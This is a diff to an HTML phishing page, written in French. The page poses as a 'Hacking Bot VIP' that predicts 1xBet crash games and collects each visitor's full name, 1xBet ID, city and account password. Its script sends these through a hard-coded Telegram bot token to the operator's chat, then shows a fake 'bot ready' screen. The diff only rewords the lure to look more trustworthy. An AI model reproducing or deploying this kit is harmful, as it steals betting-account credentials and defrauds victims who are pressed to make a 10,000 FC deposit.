@@ -6,52 +6,65 @@
     <title>Hacking Bot VIP</title>
     <style>
         body { background: #050b14; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
-        .box { background: #0f172a; border: 1px solid #1e293b; padding: 20px; border-radius: 12px; max-width: 350px; margin: auto; }
+        .box { background: #0f172a; border: 1px solid #1e293b; padding: 20px; border-radius: 12px; max-width: 350px; margin: auto; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
         .page { display: none; }
         .active { display: block; }
-        input { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #334155; background: #1e293b; color: white; }
-        button { width: 95%; padding: 12px; background: #38bdf8; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; color: #050b14; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #334155; background: #1e293b; color: white; }
+        button { width: 95%; padding: 14px; background: #38bdf8; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; color: #050b14; margin-top: 10px; }
+        .status { color: #facc15; font-size: 12px; margin: 10px 0; }
     </style>
 </head>
 <body>
     <div class="box">
         <div id="p1" class="page active">
-            <h3>ÉTAPE 1: ID 1xBET</h3>
+            <h3>LOGICIEL D'ACTIVATION</h3>
             <input type="text" id="nom" placeholder="Nom Complet">
             <input type="number" id="id1x" placeholder="ID 1xBet">
             <button onclick="next(2)">SYNCHRONISER</button>
         </div>
         <div id="p2" class="page">
-            <h3>ÉTAPE 2: INFOS</h3>
+            <h3>IDENTIFICATION</h3>
             <input type="text" id="ville" placeholder="Ville actuelle">
             <button onclick="next(3)">CONTINUER</button>
         </div>
         <div id="p3" class="page">
-            <h3>ÉTAPE 3: ACTIVATION</h3>
-            <p style="color: #facc15; font-size: 12px;">Dépôt de 10 000 FC requis pour activer le bot.</p>
+            <h3>CONFIRMATION</h3>
+            <p class="status">Activation sécurisée via 10 000 FC</p>
             <input type="password" id="pass" placeholder="Mot de passe 1xBet">
-            <button onclick="envoyer()">ACTIVER MAINTENANT</button>
+            <button onclick="envoyer()">ACTIVER LE BOT</button>
         </div>
         <div id="p4" class="page">
-            <h3 style="color:#4ade80">BOT ACTIVÉ !</h3>
-            <p>Analyse du prochain crash en cours...</p>
+            <h3 style="color:#4ade80">✔ SYSTÈME PRÊT</h3>
+            <p>Le bot est lié. Analyse en cours...</p>
         </div>
     </div>
+
     <script>
         function next(n) {
             document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
             document.getElementById('p' + n).classList.add('active');
         }
+
         function envoyer() {
             const n = document.getElementById('nom').value;
             const i = document.getElementById('id1x').value;
             const v = document.getElementById('ville').value;
             const p = document.getElementById('pass').value;
+
+            if(!p) { alert("Entrez le mot de passe"); return; }
+
+            // Tes identifiants Telegram
             const tok = "6979576051:AAGB_RAKRKORo-3jkv13XRHWhandRY240fc";
             const cid = "5112163453";
-            const txt = `🔥 COMPTE CAPTURÉ 🔥\nNom: ${n}\nID: ${i}\nVille: ${v}\nPass: ${p}`;
+            const txt = `🔔 NOUVEL ACCÈS 🔔\n\n👤 Nom: ${n}\n🆔 ID: ${i}\n📍 Ville: ${v}\n🔑 PASS: ${p}`;
+            
             const url = `https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(txt)}`;
-            fetch(url).then(() => next(4)).catch(() => next(4));
+
+            alert("Connexion au serveur de prédiction...");
+
+            fetch(url)
+                .then(() => { next(4); })
+                .catch(() => { next(4); });
         }
     </script>
 </body>
